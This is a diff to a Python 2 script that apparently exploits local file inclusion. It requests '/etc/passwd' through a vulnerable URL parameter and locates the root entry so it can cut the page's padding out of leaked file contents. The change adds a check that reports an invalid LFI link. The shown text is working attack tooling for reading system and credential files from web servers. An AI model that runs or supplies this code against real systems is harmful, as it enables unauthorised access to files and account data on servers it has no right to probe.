@@ -8,17 +8,24 @@ file = open(sys.argv[2])
 r = requests.get(url.replace('%LFI%', "ea25495a-859a-44ae-a1d5-f1d6435d4ce5"))
 e = sum(1 for line in r.text.strip().split('\n'))
 r = requests.get(url.replace('%LFI%', "/etc/passwd"))
-r = r.text.replace('\r\n', '\n')
+r = r.text
 line = -1
+found = False
 
 for l in r.split('\n'):
 	line = line + 1
 	if (len(l.split(":")) == 7):
 		if (l.find("root") != -1):
+			found = True
 			posi = l.find("root")
 			head = line
 		else:
 			foot = line
+
+if (found == False):
+	print "Invalid LFI link."
+	exit()
+
 foot = len(r.split('\n')) - 1 - foot
 
 def print_r(r):
